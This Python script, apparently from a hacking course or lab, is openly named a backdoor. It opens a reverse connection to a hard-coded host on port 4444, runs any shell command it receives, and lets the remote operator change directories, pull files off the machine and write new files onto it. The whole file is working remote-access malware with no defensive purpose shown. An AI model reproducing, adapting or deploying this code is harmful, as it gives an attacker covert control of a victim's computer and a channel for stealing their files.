#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import re
import json
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        data_size = str(len(data)) + "\n"
        self.connection.send(data_size)
        self.connection.send(data)

    def reliable_receive(self):
        data = self.connection.recv(1024)
        data_size = re.search("\d*\\n", data).group(0)
        data = data.replace(data_size, "")

        while len(data) != int(data_size):
            data = data + self.connection.recv(1024)

        return data

    def change_working_directory(self, command_list):
        path = command_list[1]
        os.chdir(path)
        return "Changing working directory to " + path

    def download_file(self, command_list):
        path = command_list[1]
        with open(path, "rb") as file:
            return file.read()

    def upload_file(self, command_list):
        path = command_list[1]
        file_content = base64.b64decode(command_list[2])
        with open(path, "wb") as file:
            file.write(file_content)
            return "[+] Upload successful."

    def execute_command(self, command_list):
        command = command_list[0]
        if command == "exit":
            self.connection.close()
            exit()
        elif command == "cd" and len(command_list) > 1:
            return self.change_working_directory(command_list)
        elif command == "download":
            return self.download_file(command_list)
        elif command == "upload":
            return self.upload_file(command_list)
        else:
            return self.execute_system_command(command_list)

    def run(self):
        while True:
            command = self.reliable_receive()
            command_list = json.loads(command)
            try:
                command_result = self.execute_command(command_list)
            except Exception as e:
                print(e)
                command_result = "This command doesn't exists. Try again."
            self.reliable_send(command_result)

        self.connection.close()


my_backdoor = Backdoor("192.168.235.155", 4444)
my_backdoor.run()
